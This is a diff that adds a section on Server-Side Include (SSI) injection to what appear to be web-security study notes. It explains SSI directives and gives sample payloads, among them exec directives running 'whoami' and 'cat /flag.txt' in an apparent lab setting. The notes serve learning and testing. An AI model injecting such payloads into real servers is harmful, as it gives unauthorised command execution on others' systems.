@@ -76,3 +76,53 @@ Accept: */*
 
 There are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).
 
+# Exploiting SSI Injection
+
+Server-Side Includes (SSI) is a technology that web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude). The use of SSI can often be inferred from the file extension. Typical file extensions include `.shtml`, `.shtm`, and `.stm`.
+
+## SSI Directives
+
+SSI utilizes `directives` to add dynamically generated content to a static HTML page. These directives consist of the following components:
+
+- `name`: the directive's name
+- `parameter name`: one or more parameters
+- `value`: one or more parameter values
+
+An SSI directive has the following syntax:
+
+```ssi
+<!--#name param1="value1" param2="value" -->
+```
+
+## printenv
+
+```ssi
+<!--#printenv -->
+```
+
+## config 
+
+```ssi
+<!--#config errmsg="Error!" -->
+```
+
+## echo
+
+```ssi
+<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
+```
+
+## exec
+
+```ssi
+<!--#exec cmd="whoami" -->
+
+<!--#exec cmd="cat /flag.txt" -->
+```
+
+## include
+
+```ssi
+<!--#include virtual="index.html" -->
+```
+
